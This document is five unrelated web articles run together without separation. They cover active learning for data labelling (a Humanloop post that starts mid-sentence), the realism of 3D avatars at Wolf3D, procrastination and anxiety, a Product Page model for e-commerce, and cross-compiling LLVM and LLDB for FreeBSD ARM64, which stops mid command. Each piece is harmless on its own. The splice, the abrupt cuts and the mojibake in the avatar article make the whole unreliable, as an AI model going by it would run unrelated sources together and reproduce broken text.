leverage Bayesian deep learning to get better uncertainty estimates.</p><h2 id="three-benefits-of-using-active-learning">Three Benefits of Using Active Learning</h2><h3 id="1-you-spend-less-time-and-money-on-labelling-data">1. You spend less time and money on labelling data</h3><p>Active learning has been shown to deliver large savings in data labelling across a wide range of tasks and data sets ranging from computer vision to NLP. Since data labelling is one of the most expensive parts of training modern machine learning models this should be enough justification on its own!</p><figure><img src="https://humanloop.com/blog/content/images/2021/01/learning_curves.png" alt="" srcset="https://humanloop.com/blog/content/images/size/w600/2021/01/learning_curves.png 600w, https://humanloop.com/blog/content/images/2021/01/learning_curves.png 700w"><figcaption>Using active learning gets to higher model accuracies with less labelled data</figcaption></figure><h3 id="2-you-get-faster-feedback-on-model-performance">2. You get faster feedback on model performance</h3><p>Usually people label their data <em>before</em> they train any models or get any feedback. Often, it takes days or weeks of iterating on annotation guidelines and re-labelling only to discover that model performance falls far short of what is needed, or different labelled data is required. Since Active Learning trains a model frequently <em>during</em> the data labelling process, it's possible to get feedback and correct issues that might otherwise be discovered much later.</p><h3 id="3-your-model-will-have-higher-final-accuracy">3. Your model will have higher final accuracy</h3><p>People are often surprised that models trained with active learning not only learn faster but can actually converge to a better final model (with less data). We're told so often that more data is better, that it's easy to forget that the quality of the data matters just as much as the quantity. If the dataset contains ambiguous examples which are hard to label accurately this can actually degrade your final model performance.</p><p>The order the model sees examples also matters. There's an entire sub-field of machine learning, called curriculum learning, which studies how you can improve model performance by first teaching about simple concepts before teaching complex ones. &nbsp;Think "Arithmetic before advanced calculus". Active learning naturally enforces a curriculum on your models and helps them achieve better overall performance.</p><h2 id="if-active-learning-is-so-great-then-why-doesn-t-everyone-use-it">If active learning is so great, then why doesn't everyone use it?</h2><p>Most of our tools and processes for building machine learning models weren't designed with Active Learning in mind. There are often different teams of people responsible for data labelling vs model training but active learning requires these processes to be coupled. If you do get these teams to work together, you still need a lot of infrastructure to connect model training to annotation interfaces. Most of the software libraries being used assume all of your data is labelled before you train a model, so to use active learning you have to write a tonne of boiler plate. You also need to figure out how best to host your model, have the model communicate with a team of annotators and update itself as it gets data asynchronously from different annotators.</p><p>On top of this, modern deep learning models are very slow to update, so frequently retraining them from scratch is painful. Nobody wants to label a hundred examples then wait 24 hours for a model to be fully re-trained before labelling the next 100. Deep learning models also tend to have millions or billions of parameters and getting good uncertainty estimates from these models is an open research problem.</p><p>If you read academic papers on active learning, you might think active learning will give you a small saving in labels but for a huge amount of work. The papers are misleading though because they operate on academic datasets that tend to be balanced/clean. They almost always label one example at a time and they forget that not every data-point is equally easy to label. On more realistic problems with large class imbalances, noisy data and variable labelling costs, the benefits can be much bigger than the literature suggests. In some cases there can be a 10x reduction in labelling costs.</p><h2 id="how-to-use-active-learning-today">How to use Active Learning today</h2><figure><img src="https://humanloop.com/blog/content/images/2021/02/logos-1.png" alt="" srcset="https://humanloop.com/blog/content/images/size/w600/2021/02/logos-1.png 600w, https://humanloop.com/blog/content/images/size/w1000/2021/02/logos-1.png 1000w, https://humanloop.com/blog/content/images/size/w1600/2021/02/logos-1.png 1600w, https://humanloop.com/blog/content/images/size/w2400/2021/02/logos-1.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Many of the biggest hurdles to using active learning are just a question of having the right infrastructure. Just as tools like Keras and PyTorch dramatically reduced the pain of deriving gradients, new tools are emerging to make active learning much easier.</p><p>There are open source python libraries such as <a href="https://github.com/modAL-python/modAL">modAL</a> that take away much of the boilerplate. ModAL is built on top of scikit-learn and lets you combine different models with any active learning strategy you like. It takes much of the work out of implementing different uncertainty measures, is open source and modular. The pros of ModAL are the range of methods it provides out of the box and the fact that it's open source. The downside of libraries like modAL is they don't include any annotation interfaces and still leave the work of hosting a model and connecting it to annotation interfaces up to you.</p><p>That brings us to annotation interfaces:</p><p>Probably the most popular tool for individual data scientists is Prodigy. Prodigy is an annotation interface built by the makers of Spacy and so can naturally be combined with their fantastic NLP library to use basic active learning. It's not open-source but you can download it as a pip wheel and install it locally. Whilst Prodigy is a good tool for individuals, it hasn't been designed to support teams of annotators and only implements the most basic forms of Active Learning. To make this work with teams, still requires you to host prodigy yourself and can be a lot of work to set up.</p><p>Labelbox provides interfaces for a variety of image annotations and has recently added support for text as well. Unlike Prodigy, Labelbox has been designed with teams of annotators in mind and has more tools for ensuring that your labels are correct. They don't have any native support for active learning or model training but do allow you to upload predictions from your model to the annotation interface via API. This means that if you have implemented an active learning acquisition function and are training a model, you can set up an active learning loop. Though the most of the work is left to you.</p><h2 id="humanloop">Humanloop</h2><p>We built Humanloop to solve many of the problems of existing tools. Our goal is to make deploying and maintaining natural language models faster and easier than ever before.</p><p>Humanloop provides an annotation interface for NLP tasks that lets you train a model as you annotate and uses active learning out of the box. We support teams of annotators and have incorporated state of the art techniques for active learning and quality assurance. This makes it possible to get real time feedback during training, even when using modern deep models. We also make it easy to deploy to an optimised model run-time immediately after training and to even update your data post deployment.</p><h2 id="in-summary">In Summary</h2><p>Active Learning:</p><ul><li>reduces how much data you need to label, dramatically reducing one of your biggest costs.</li><li>gives you faster feedback on your model's performance.</li><li>producer higher performing models.</li></ul><p>At Humanloop we think that active learning should be a standard tool for data scientists. We also believe that good tools should make this easy.</p><p>There's more to Humanloop than active learning though. We're building infrastructure for AI models and human teams to work alongside each other so that anyone can quickly augment their team with AI assistance.</p><p>If you're interested in finding out more, send us a message or <a href="https://humanloop.com/demo">book a demo!</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2 data-reactroot=""><b>What we learned about 3D avatars in 7 years of making them</b></h2><p data-reactroot=""><span>Christoph Niemann is an illustrator whose work was featured on over thirty covers of the New Yorker magazine. In the first episode of Netflix's docuseries "Abstract,â€� Niemann introduced a concept called </span><i><span>abstract-o-meter</span></i><span>. It suggests that </span><b>every idea has a </b><b><i>just-right</i></b><b> way to represent it</b><span>. It canâ€™t be too abstract nor too realistic. For example, no one would know that you meant to talk about love if you used a red pixel to represent it. The same thing applies to a realistic drawing of heart, which looks more disgusting rather than lovely. Hence when we talk about love, we use the heart-shaped symbol that everyone is familiar with.</span></p><p data-reactroot=""><b>The same concept applies to 3D avatars that we use to represent our identities in virtual worlds and to show our emotions to others</b><span>.</span></p><p data-reactroot=""><span><img src="https://www.datocms-assets.com/36636/1612446205-abstract-o-meter-3d-avatars-readyplayerme-wolf3d.png" alt="A scale showing realistic heart, a heart shape, and a red pixel drawings" title="Christoph Niemann's &quot;Abstract-o-meter&quot;"></span></p><p data-reactroot=""><i><span>Abstract-o-meter, Christoph Niemann</span></i></p><h2 data-reactroot=""><b>Abstract 3D avatars are too simple</b></h2><p data-reactroot=""><span>It's hard to show our expressions in games with a simple and abstract visual style. In Minecraft, the avatar's face measures 8x8 pixels. Itâ€™s barely enough room to fit eyes and a mouth â€“ not enough to represent a wide range of emotions. In fact, Minecraft doesn't offer any expressions besides blinking with compatible character skins.Â&nbsp;</span></p><p data-reactroot=""><span><img src="https://www.datocms-assets.com/36636/1612447071-minecraft-star-wars-avatars-readyplayerme-wolf3d.png" alt="Minecraft Star Wars Sequel Skin Pack" title="Minecraft avatars from Star Wars"></span></p><p data-reactroot=""><i><span>Minecraft Star Wars Sequel Skin Pack (Mojang Studios)</span></i></p><p data-reactroot=""><span>Showing your identity in a world made of big pixels isn't a simple task either. You can give someone a general idea of how you look and what colors you like to wear. But it would be hard to distinguish, for example, a black denim jacket from an elegant blazer.</span></p><h2 data-reactroot=""><b>Hyper-realistic 3D avatars are too realistic</b></h2><p data-reactroot=""><span>On the other side of the spectrum, we have hyper-realistic avatars. In Rogue One, </span><a href="https://www.nytimes.com/2016/12/27/movies/how-rogue-one-brought-back-grand-moff-tarkin.html"><span>Disney created a digital version of Wilhuff Tarkin</span></a><span> based on the actor who played him a few decades before â€“ Peter Cushing. This was possible thanks to advanced motion tracking technology and an actor (Guy Henry) who learned how to behave and talk like Cushing.Â&nbsp;</span></p><p data-reactroot=""><span>The same technique is used in modern AAA games, like Cyberpunk 2077. The challenging part is to make the representation perfect. Otherwise, we experience an effect called the </span><a href="https://en.wikipedia.org/wiki/Uncanny_Valley"><b>uncanny valley</b></a><span>. If the humanoid character or object doesn't perfectly resemble a human, we tend to have negative emotions. In other words â€“ we are creeped out.</span></p><p data-reactroot=""><span><img src="https://www.datocms-assets.com/36636/1612446327-star-wars-rogue-one-tarkin-3d-realistic-avatar-readyplayerme-wolf3d.png" alt="Hyper-realistic model of Tarkin in Rogue One: A Star Wars Story movie" title="Hyper-realistic model of Tarkin in Rogue One: A Star Wars Story movie"></span></p><p data-reactroot=""><i><span>Rogue One: A Star Wars Story (Lucasfilm)</span></i></p><p data-reactroot=""><span>In the movie and gaming industries, studios have access to and can afford advanced tracking solutions. But they also spend thousands of hours on post-processing to make the characters look like real humans. </span><b>For consumers, thereâ€™s no way to use a hyper-realistic avatar based on the userâ€™s appearance. </b><span>Modern games often have advanced character creators, but customization options are limited just to pre-set values and assets.Â&nbsp;</span></p><p data-reactroot=""><span>These avatars are also not able to represent the playerâ€™s expressions. And there is no affordable face tracking devices available on the mass market that could produce results comparable to the recent Star Wars movies. Not to mention the challenge of rendering super-detailed 3D characters, especially in games like Call of Duty: Warzone with a hundred players on one server.</span></p><h2 data-reactroot=""><b>The </b><b><i>just-right</i></b><b> solution for 3D avatars</b></h2><p data-reactroot=""><span>The </span><i><span>just-right</span></i><span> solution for avatars is a simple one. Going back to the uncanny valley concept â€“ it's called a </span><i><span>valley</span></i><span> because we dislike only humanoids that look </span><i><span>almost</span></i><span> like humans. </span><b>But we tend to like </b><b><i>slightly</i></b><b> abstract representations of humans, like cartoon and game characters</b><span>. These avatars are more detailed than the Minecraft ones, making it easier to show one's identity and emotions. On the other hand, they are not too detailed, making it simpler to show basic emotions without creeping someone out. They are also less challenging to render for average hardware, even in large scale games like Fortnite.</span></p><p data-reactroot=""><span><img src="https://www.datocms-assets.com/36636/1612446407-fortnite-avatar-battle-royale-game-readyplayer-me-wolf3d.jpeg" alt="3D characters in game Fornite" title="Fortnite from Epic Games"></span></p><p data-reactroot=""><i><span>Fortnite (Epic Games)</span></i></p><p data-reactroot=""><span>The current state of consumer technology allows us to use these simpler avatars to have social interactions in the virtual worlds. For example, there are software-based solutions for emulating mouth movement, like </span><a href="https://developer.oculus.com/downloads/package/oculus-lipsync-unity/"><span>Oculus Lipsync</span></a><span>. We can also get a good representation of body movement with the controllers that come with virtual reality headsets available today. This is essential for getting non-verbal communication in virtual worlds right.Â&nbsp;</span></p><h2 data-reactroot=""><b>Finding the right balance for 3D avatars</b></h2><p data-reactroot=""><span>But there's one more reason why less realistic avatars are </span><i><span>just right</span></i><span>, and we learned it through our companyâ€™s long history of making avatars. When we started Wolf3D seven years ago, we built full-body scanners for creating hyper-realistic human models desired by movie and gaming studios. When Facebook acquired Oculus in 2014, we realized that 3D avatars will play an important role in the future. </span><b>We shifted our focus and decided to make it easy for anyone to create their own 3D avatar</b><span>.</span></p><p data-reactroot=""><span>Our first step in that direction was easy-to-use, egg-shaped face scanners. We shipped them to many places worldwide, including museums in Estonia and Finland, E3 game shows in Las Vegas, and Paramount Studios in Hollywood.Â&nbsp;</span></p><p data-reactroot=""><span>The next step was to make scanning even more accessible. </span><b>We decided to use the data from tens of thousands of high-resolution scans to build a software-based solution</b><span>. With just fifteen photos and a phone app, anyone could create a realistic 3D model of their face.</span></p><p data-reactroot=""><span><img src="https://www.datocms-assets.com/36636/1612446455-egg-face-3d-scanner-readyplayerme-avatars-wolf3d.png" alt="Wolf3D's high-quality 3D face scanner " title="The egg-shaped face scanner from Wolf3D"></span></p><p data-reactroot=""><i><span>Wolf3Dâ€™s egg-shaped scanner</span></i></p><p data-reactroot=""><span>At this stage, </span><b>we learned that people didn't want an avatar that looks </b><b><i>exactly</i></b><b> like them â€“ they wanted something more</b><span>. It's like with Instagram profiles â€” no one posts photos of their dirty dishes (please, prove me wrong). Instead, we choose to create an idealistic version of our lives featuring pictures from trips to Bali, plates full of sushi, and selfies from Coachella.</span></p><h2 data-reactroot=""><b>Where are we now and what's the future of 3D avatars</b></h2><p data-reactroot=""><span>Learning this, </span><b>we set Wolf3D on its current tracks and made a simpler avatar creator based on a single selfie</b><span>. It allows anyone with a camera and access to the Internet to create an idealized, 3D version of themselves. All with the </span><i><span>just-right</span></i><span> balance â€“ not too abstract, not too realistic. Cristian Anton, Co-founder and CEO of MeetinVR, said in an </span><a href="https://readyplayer.me/blog/talking-about-realistic-3d-avatars-and-future-of-work-with-meetinvrs-ceo"><span>interview with Wolf3D's CEO</span></a><span> that "</span><i><span>what we have here [...] is like the perfect balance, at least for what is possible with the current technology.</span></i><span>"</span></p><p data-reactroot=""><span><img alt="3D human avatars standing in different poses on a green background" title="Just the right balance between realistic and abstract avatars" src="https://www.datocms-assets.com/36636/1612445670-realistic-3d-avatars-ready-player-me-wolf3d.jpg"></span></p><p data-reactroot=""><i><span>Wolf3Dâ€™s Ready Player Me avatars</span></i></p><p data-reactroot=""><a href="https://readyplayer.me/"><b>Ready Player Me</b></a><b> avatars are our current </b><b><i>just-right</i></b><b> solution for avatars</b><span>. They are available in 40+ apps and games, allowing people to have social interactions in virtual worlds while keeping a consistent digital identity.

All using the same avatar.</span></p><p data-reactroot=""><span>If the future technology allows for it, we might see the shift towards more realistic avatars.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				




<h2>Background</h2>



<p>Interestingly enough, it took me four months to start writing an article about starting things. I’m not kidding:</p>



<div><figure><img loading="lazy" width="556" height="522" src="https://unstructed.tech/wp-content/uploads/2021/01/linkedin-announcement.png" data-src="https://unstructed.tech/wp-content/uploads/2021/01/linkedin-announcement.png" alt="" data-srcset="https://unstructed.tech/wp-content/uploads/2021/01/linkedin-announcement.png 556w, https://unstructed.tech/wp-content/uploads/2021/01/linkedin-announcement-300x282.png 300w" data-sizes="(max-width: 556px) 100vw, 556px" srcset="https://unstructed.tech/wp-content/uploads/2021/01/linkedin-announcement.png 556w, https://unstructed.tech/wp-content/uploads/2021/01/linkedin-announcement-300x282.png 300w"></figure></div>



<p>I did publish the <a href="https://unstructed.tech/2020/12/11/we-all-come-with-a-bucket-of-sht/">bucket of sh*t one</a> after two months, but this one took a while. Which I think is a perfect starting ground for analyzing what I wanted to write about anyway – why do we keep delaying and procrastinating with stuff. </p>



<p>This article is broken into two parts. In the first part, we will be dealing with all the reasons why we delay, procrastinate and generally avoid starting things. In the second part, we will discuss specific steps that you can (and should) take in order to actually start doing them. Lastly, I will provide a list of resources that you might find useful.</p>



<p>So, let’s start with – WHY.</p>



<h2>Part I – Why?</h2>



<p>Starting this section without referring to one of THE BEST articles I ever read on this subject would be absolutely unfair. It was almost eight years ago that a friend of mine sent me the article that “I just have to read. Immediately!”. <a href="https://waitbutwhy.com/2013/10/why-procrastinators-procrastinate.html" target="_blank" rel="noreferrer noopener">Why Procrastinators Procrastinate</a> is, to this day, one of THE MOST influential articles I ever read on the subject. Once you finish this one, I would urge you to go and read that one as well. It is listed in the “Useful Resources” section so you won’t miss it.</p>



<p>Anyway, why do we delay doing things that we want to do? And this can literally be anything – starting those yoga classes, changing a job, writing a graduation thesis, committing to a new diet or, in this specific case – starting an article about starting new things.</p>



<p>Obviously, I can’t speak for everyone out there, but I surely can tell you what my problem is. And, in all honesty, what seems to be a common denominator for all of those that I’ve spoken to. It always boils down to – fear. Fear of the unknown. Fear of the uncertainty. Fear of failing. Fear of being laughed at. Fear of being afraid. Yikes!</p>



<p>Let’s talk fear.</p>



<h3>Fear</h3>



<p>Strictly speaking, what I refer to as “fear” is what my therapist calls “anxiety”. Here’s how he describes it (and I’m paraphrasing, obviously):</p>



<blockquote><p>Anxiety is when you are afraid that there is a lion in the room, even though there isn’t one. Fear is when there actually IS a lion in the room.</p><cite>Source: my therapist</cite></blockquote>



<p>Fear is a really useful emotion. Just stop and think about it. It’s what helped our species survive and evolve enough to argue politics and record TikTok videos. Seriously. Let me quote Wikipedia as well:</p>



<blockquote><p>Fear is an emotion induced by perceived danger or threat, which causes physiological changes and ultimately behavioral changes, such as fleeing, hiding, or freezing from perceived traumatic events. Fear in human beings may occur in response to a certain stimulus occurring in the present, or in anticipation or expectation of a future threat perceived as a risk to oneself. The fear response arises from the perception of danger leading to confrontation with or escape from/avoiding the threat (also known as the fight-or-flight response), which in extreme cases of fear (horror and terror) can be a freeze response or paralysis.</p><cite>Source: <a href="https://en.wikipedia.org/wiki/Fear" target="_blank" rel="noreferrer noopener">Wikipedia</a></cite></blockquote>



<p>Again, think about it. Or, better yet, <span>think of our ancestors. Hundreds of thousand of years ago, if they weren’t able to perceive a danger of being eaten by a lion, I wouldn’t be here writing this and you surely wouldn’t be the one reading it</span>. It’s valid even today – standing on the edge of the cliff, if there weren’t for a fear, you’d have no problem jumping off. Or being hit by a car. My point is – <span>fear is an extremely useful emotion and definitely the one favored by evolution</span>. It helps you survive.</p>



<p>Let me share one anecdote – there was a period in my life when, for whatever the reasons were, I got obsessed with the psychopathy. And I’ve been reading A LOT about it. Yep. It sounds crazy, I know, but there was some reasoning behind it. If you’ve never read anything of the kind, you’re probably thinking of “psychopaths” as a crazy axe swinging murderers who butcher people for fun. Well, sorry to disappoint you but that’s just Hollywood (mostly). Psychopathy, in a very layman’s terms, refers to a different structure of a brain which, among other things, causes a complete lack of empathy. As in – they have no sense of regret. Now, without going into too many details of it, one of the things that psychopaths experience is – lack of fear. They don’t have any sense of fear (or it’s a very very weak one). And you know what the problem is? They have HARD time surviving! Which explains why’s there not that many of them. In order to live long enough to be portrayed in movies, they actually have to LEARN what things are dangerous and what can (and will) kill them. Yep. So, without spending too much time on the topic, I just want to say – be grateful for that sense of fear that you have.</p>



<p>Anyway, let me go back to the original story. Fear and anxiety. So, fear is a useful emotion that helps you survive. But anxiety? Not so much.</p>



<p>Let’s talk anxiety now.</p>



<h3>Anxiety</h3>



<p>Here’s what Wikipedia says on the subject:</p>



<blockquote><p>Anxiety is an emotion characterized by an unpleasant state of inner turmoil, often accompanied by nervous behavior such as pacing back and forth, somatic complaints, and rumination. It includes subjectively unpleasant feelings of dread over anticipated events.</p><cite>Source: <a href="https://en.wikipedia.org/wiki/Anxiety" target="_blank" rel="noreferrer noopener">Wikipedia</a></cite></blockquote>



<p>Looks similar to fear, right? And yet, it’s not. <span>Fear is helpful. Anxiety is rather opposite</span>. Fear is what helps you live to see another day and watch Netflix. Anxiety is what prohibits you from living long, happy and healthy enough to watch all those Netflix shows. <span>Favor the fear, but be careful of anxiety</span>.</p>



<p>From my point of view, and please do take this with outmost grain of salt, but – <span><strong>I believe that <em>one of</em> the main issues is that we confuse anxiety for fear</strong></span>. More specifically, we perceive anxiousness as a fear and, a natural behavioural response is – to get the hell out of that situation. Even if it’s only in our heads, the response is nevertheless the same.</p>



<p>Now, a logical question that follows is – how do you get rid of anxiety? Well, let me burst that bubble immediately – you don’t. I’m not a specialist of any kind but, <span>from my investigation and experience, there’s not a single emotion that you can “get rid off”. What you can (and should) do is – learn the tools of the trade</span>. Learn how to deal with them and, eventually, live with them. Easier said than done, but absolutely doable.</p>



<h3>Tools of the trade</h3>



<p>Let me tell you two more anecdotes. I have no idea why, but I seem to be all about anecdotes today.</p>



<p>I was listening (well, technically I’m re-listening to it almost every day during a workout) to Pavel Tsatsouline talking about muscle hypertrophy. For those who are not familiar with the guy – he’s an amazingly respected fitness instructor who, among other things, “brought” kettlebells to USA. And muscle hypertrophy is, well, the process of growing your muscles really. So, what he was saying is – “when it comes to muscle hypertrophy, we pretty much have no idea what’s really happening. But we do know which buttons to push and we do have the tools of the trade that help us get there”. Hence, <span>we have no clue WHY or HOW the muscles really grow, but we do know how to get them to do so</span>.</p>



<p>Another one is from the book written by Robert C. Martin, famously known (to developers) as Uncle Bob. It’s about agile development. And one thing that I highlighted and that I’m quoting in its original form is – “Some folks think that Agile is about going fast. It’s not. It’s never been about going fast. Agile is about knowing, as early as possible, just how screwed we are.”. </p>



<p>Now, one might wonder, and rightfully so – what the hell am I talking about? And <span>what exactly is a connection between muscle hypertrophy, agile development and dealing with anxiet</span>y, right? Well, let me help you make that connection. Both are amazingly complex processes, for which we mostly have no idea what exactly is happening, but we do have enough data and knowledge to tackle them properly. <span><strong>And that’s exactly how you should tackle any anxiety – by using the battle tested tools of the trade that we have</strong></span>. That’s what the Part II is all about anyway.</p>



<p>I’ll close this section with a quote from Jordan Peterson who happens to be, among other things, a rather famous clinical psychologist. I’m paraphrasing his words: “Do you know how we approach and help people who are extremely anxious? We first explain to them that they will never be ‘free’ of anxiety. They will always remain anxious. But <span>through careful chunking and constant work, we help them get used to that feeling, until it loses its intensity. It’s still there, but it’s not blocking you any more. And that’s how you beat anxiety</span>“.</p>



<h2>Part II – How?</h2>



<p>If you read the Part I, which I hope you did, you probably concluded what I believe is the biggest obstacle to embarking on anything new. If not, well, here’s a quick summary – it’s all about fear. Yep. Whatever the reasoning you come up with, if you dig deep enough, you will end up with some sort of fear. Or, shall I say, anxiety? 🙂</p>



<p>Now, does that make it any easier to deal with? Hell no! Quite the contrary. <span>Starting anything new is HARD</span>. Especially if it’s something that you never did before. Not to mention if you tried and “failed”. Ouch!</p>



<p>So, let me repeat that. <span>Starting anything new is DAMN HARD</span>. Just like growing muscles or starting a new project is. But here’s the most important thing – <span>once we accept that it’s hard and that it’s ok for it to be hard, and trust me, <strong>sometimes acceptance is the hardest part</strong>, we are ready for the next step</span>. And the next step is – using the tools of the trade that were battle tested by many before us.</p>



<h3>Very first step – write it down and let it sink in</h3>



<p>Yep, when it comes to myself, and, I’m sure, for many others, one of the issues is that we want everything at once. Immediately. No time to waste. Or, as we sometimes put it – “I don’t want to half ass something. …</p></div></div>

  <p>A lot of e-commerce abstractions get a bit messy around abstracting products,
SKUs, product options, product variations and so on. The fact that there doesn’t
seem to be a standard or obvious abstraction for this suggests it is tricky to
get right.</p>
<p>It might be helpful in a lot of systems to extract a <em>Product Page</em> model as an
abstraction. I think this avoids a lot of the trouble as it’s easy to think
about and <a href="https://notestoself.dev/posts/code-like-conversations/">lets your code match your conversations</a>.</p>
<p>The <em>Product Page</em> models a web page (or equivalent app view) that displays
things to purchase. With this <em>Product Page</em> entity abstracted out, the
<em>Product</em> entity can be much simpler. The <em>Product</em> is then a model of a
distinct physical item with a SKU that can be on a shelf in a warehouse or shop.
A t-shirt design with three different colours to choose from is three instances
of <em>Product</em>.</p>
<p>There’s no need to mess around with any entities such as <em>Product Group</em>,
<em>Product Variation</em>, <em>Product Option</em> and so on like you find in many e-commerce
abstractions. The <em>Product</em> entity is easy to understand as it corresponds
directly to a set of real-world objects. <em>Products</em> can be associated with
<em>Product Pages</em> freely in a way that feels quite natural.</p>
<p>This abstraction captures the fact that the business is often most interested in
how to display products on a page in a useful way that maximises conversions. It
avoids the common trap of trying to capture a perceived taxonomy of objects in
the real-world that will often turn out to not be particularly meaningful to the
business.</p>
<p>I missed this opportunity when designing the abstractions for <a href="https://www.poprobincards.co.uk/" title="3D Pop Up Cards">Pop Robin
Cards</a> back in 2016, instead
going with the less-flexible <em>Product</em> and <em>Product Option</em> entities. This would
have been better modelled as <em>Product Page</em> and <em>Product</em>, respectively.</p>

<p>Moritz Systems have started a new contract with the <a href="https://freebsdfoundation.org/">FreeBSD Foundation
</a> to continue our work on modernizing
the <a href="https://lldb.llvm.org/">LLDB</a> debugger’s support for <a href="https://www.freebsd.org/">FreeBSD</a>.  Throughout the previous contract we have
introduced a FreeBSD Remote Process Plugin utilizing the mode modern
client-server layout of LLDB.</p>
<p>We have managed to achieve the feature parity with the original FreeBSD
plugin on the x86 architecture.  However, as of today other
architectures still use the original.  During the next two months,
we are going to work on bringing the remaining previously supported
architectures to the new layout, with special focus on providing first
class support for ARM64 (also known as AArch64) architecture.  Afterwards, we are going to
continue improving FreeBSD support in LLDB.</p>
<p>The complete Project Schedule is divided into four milestones, each
taking approximately one month:</p>
<ul>
<li>M1 Switch all the non-x86 CPUs to the LLDB FreeBSD
Remote-Process-Plugin.</li>
<li>M2 Iteration over regression tests on ARM64 and fixing known bugs,
marking the non-trivial ones for future work.  Remove the old
local-only Process-Plugin.</li>
<li>M3 Implement follow-fork and follow-vfork operations on par with
the GNU GDB support.  Cover the functionality with LLDB regression
tests.</li>
<li>M4 Implement SaveCore functionality for FreeBSD and enhance
the regression testing of core files in LLDB.  Update the FreeBSD
manual.</li>
</ul>
<h2 id="cross-compiling-lldb-to-other-freebsd-architectures">Cross-compiling LLDB to other FreeBSD architectures</h2>
<h3 id="a-short-introduction-to-cross-compilation">A short introduction to cross-compilation</h3>
<p>Cross-compilation is a technique permitting to use a compiler running
on one platform to create executables for another platform.  It can
be used to build software for another CPU architecture (e.g. ARM64
executables on an x86 system) or e.g. for another operating system
(e.g. FreeBSD packages from Linux), or both.</p>
<p>The most common use case for cross-compilation is to use a single
development environment to produce executables for multiple target
platforms.  What’s really important for our case, it permits building
software much faster than when running a native compiler via an emulator
or on hardware that is much less performant than modern x86 PCs
(e.g. commonly available ARM boards).</p>
<p>An important limitation of cross-compilation is that the resulting
executables cannot be executed on the platform running the compiler.
This means that the tools needed at build-time need to be built
separately – depending on the build system, this either needs to
be done manually or is done automatically as part of cross compilation.
This also means that the build scripts cannot perform tests that
require running the test program.</p>
<p>There are two main prerequisites to cross-compilation:</p>
<ol>
<li>
<p>A cross-toolchain, i.e. the compiler and link editor capable
of producing executables for the target platform.</p>
</li>
<li>
<p>A sysroot, i.e. the system libraries and dependencies compiled
for the target platform.</p>
</li>
</ol>
<h3 id="preparing-the-cross-compiler-and-sysroot">Preparing the cross-compiler and sysroot</h3>
<p>Ordinarily in order to obtain a cross-toolchain, you need to build
the compiler for a specific target.  However, the Clang compiler
that is used by default on FreeBSD has integrated cross-compilation
support.  Rather than rebuilding the whole compiler for each target,
it is sufficient to ensure that appropriate target support is enabled
at build time.  Therefore, the standard Clang builds on FreeBSD are
sufficient to cross-build for ARM and ARM64.</p>
<p>Cross-compiling a FreeBSD sysroot is very similar to building it
natively.  The only difference is the necessity of passing
a <code>TARGET_ARCH</code> variable specifying the target architecture.
For example, to build arm64 sysroot we run the following commands
in <code>/usr/src</code>:</p>
<div><pre><code data-lang="bash">make -j<span>$(</span>sysctl -n hw.ncpu<span>)</span> buildworld TARGET_ARCH<span>=</span>aarch64
make -j<span>$(</span>sysctl -n hw.ncpu<span>)</span> installworld TARGET_ARCH<span>=</span>aarch64 <span>\
</span><span></span>    DESTDIR<span>=</span>/sysroot/arm64
make -j<span>$(</span>sysctl -n hw.ncpu<span>)</span> distribution TARGET_ARCH<span>=</span>aarch64 <span>\
</span><span></span>    DESTDIR<span>=</span>/sysroot/arm64</code></pre></div>
<h3 id="cross-compiling-llvm">Cross-compiling LLVM</h3>
<p>LLVM is using the CMake build system.  CMake partially facilitates
cross-compilation itself, while the other part is handled
in LLVM-specific CMake files.</p>
<p>The first step towards cross-compiling CMake-based projects is to
create a toolchain file.  This file is used to set some internal CMake
variables that cannot be directly overriden via the command-line.
One toolchain file can be shared between multiple projects, so it is
also a convenient place to set standard cross-related CMake options.</p>
<p>For our purpose, <code>toolchain-arm64.cmake</code> contained the following
variables:</p>
<div><pre><code data-lang="cmake"><span># Since we are using clang as the compiler and it is the default
</span><span># on FreeBSD, we do not need to override the compiler.  However,
</span><span># we do need to pass a correct -target indicating the platform we're
</span><span># build for and the path to our sysroot.
</span><span></span>set(<span>CMAKE_C_FLAGS</span>
    <span>"-target aarch64-unknown-freebsd13.0 --sysroot /sysroot/arm64"</span>)<span>
</span><span></span>set(<span>CMAKE_CXX_FLAGS</span>
    <span>"-target aarch64-unknown-freebsd13.0 --sysroot /sysroot/arm64"</span>)<span>
</span><span>
</span><span></span><span># While this may seem redundant, setting it explicitly (even to the same
</span><span># value) actually causes CMake to consider itself to be cross-compiling.
</span><span># This is important since LLVM relies on CMAKE_CROSSCOMPILING being set.
</span><span></span>set(<span>CMAKE_SYSTEM_NAME</span> <span>"FreeBSD"</span>)<span>
</span><span>
</span><span></span><span># Force library search functions to use our sysroot.  Make sure it never
</span><span># uses programs from the sysroot (since we can't execute them).  Headers
</span><span># and libraries have to be taken from sysroot, on the other hand.
</span><span></span>set(<span>CMAKE_FIND_ROOT_PATH</span> <span>"/sysroot/arm64"</span>)<span>
</span><span></span>set(<span>CMAKE_FIND_ROOT_PATH_MODE_PROGRAM</span> <span>NEVER</span>)<span>
</span><span></span>set(<span>CMAKE_FIND_ROOT_PATH_MODE_LIBRARY</span> <span>ONLY</span>)<span>
</span><span></span>set(<span>CMAKE_FIND_ROOT_PATH_MODE_INCLUDE</span> <span>ONLY</span>)</code></pre></div>
<p>In addition to that, a few additional options needed to be passed
to CMake.  The following snippet explains them, in the Bash array form:</p>
<div><pre><code data-lang="bash">mkdir build.arm64
cd build.arm64

args<span>=(</span>
    <span># Path to the source directory</span>
    ../llvm

    <span># Use the Ninja generator since it's faster and has cleaner output</span>
    <span># than Makefiles.</span>
    -G Ninja

    <span># -Os builds reduce space usage while maintaining good performance.</span>
    <span># LLVM uses complex C++ that normally has a tendency towards</span>
    <span># creating huge object files.</span>
    -DCMAKE_BUILD_TYPE<span>=</span>MinSizeRel

    <span># Enable assertions to aid debugging.</span>
    -DLLVM_ENABLE_ASSERTIONS<span>=</span>ON

    <span># Build LLVM, Clang and LLDB.</span>
    -DLLVM_ENABLE_PROJECTS<span>=</span><span>'llvm;clang;lldb'</span>

    <span># Set the toolchain to built for aarch64 by default.</span>
    -DLLVM_DEFAULT_TARGET_TRIPLE<span>=</span>aarch64-unknown-freebsd13.0
    -DLLVM_HOST_TRIPLE<span>=</span>aarch64-unknown-freebsd13.0
    -DLLVM_TARGET_ARCH<span>=</span>AArch64
